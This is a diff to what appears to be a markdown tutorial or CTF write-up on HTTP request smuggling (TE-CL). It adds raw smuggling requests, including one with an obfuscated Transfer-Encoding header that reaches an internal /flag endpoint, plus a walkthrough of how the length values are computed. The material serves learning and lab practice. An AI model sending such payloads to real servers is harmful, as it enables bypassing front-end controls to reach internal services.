@@ -328,10 +328,60 @@ For more visit [This Blog](https://stackoverflow.com/questions/2773396/whats-the
 </p>
 
 **`Calculating Transfer-Encoding header:`**
+							    
+```
+GET / HTTP/1.1
+Host: 192.168.0.109
+Content-Length: 4
+Transfer-Encoding: chunked
+
+2c
+GET /path HTTP/1.1
+Host: 127.0.0.1:8080
+
+
+0
+```
 
 <p>
       <a href="https://drive.google.com/file/d/12TvWtaJgUNUw7awFeGUYW9mQbh7NTY0s/view">
 	   <kbd>
-	     <img src="/Images/Live.png" height=300 width=700"></a>
+	     <img src="/Images/19.png" height=300 width=800"></a>
 	    </kbd>
 </p>
+
+On above example we are having the TE-CL Vulnerability on server. Let me explain all values one by one.
+- "Content-Length" header in request is set according to the size of the "2c\r\n" bytes. According to method, we are calculating the total size of first line of the content. Here we also calculating the "\r\n" new line feed.
+- "Transfer-Encoding" header is calculated by total bytes of the content. Here we are having simple HTTP GET request which size is 44 till the header ends, after "\r\n\r\n0" which indicate to stop. Decimal 44 is now converted to hexadecimal which gives "2c". The reason we have added "2c" before the content is the total hexadecimal value of the content. - After the "0" we have to add two "\r\n" line feed and send the request to the server.
+
+If you send below request to the CTF server. which gives the response with the flag.
+
+```
+
+GET /a HTTP/1.1
+Host: 192.168.0.109
+Content-Length: 4
+Transfer-Encoding: chunkedasd
+
+2c
+GET /flag HTTP/1.1
+Host: 127.0.0.1:8080
+
+
+0
+
+GET /a HTTP/1.1
+Host: 127.0.0.1:8080
+    
+```
+
+<p>
+      <a href="https://drive.google.com/file/d/12TvWtaJgUNUw7awFeGUYW9mQbh7NTY0s/view">
+	   <kbd>
+	     <img src="/Images/21.png" height=320 width=800"></a>
+	    </kbd>
+</p>
+							    
+							    
+For learn more you can visit [PortSwigger's Labs](https://portswigger.net/web-security/request-smuggling). They provide free and has almost every attacks labs for practice. Also, visit writeups to stay upto date with latest attack techniques.
+							    
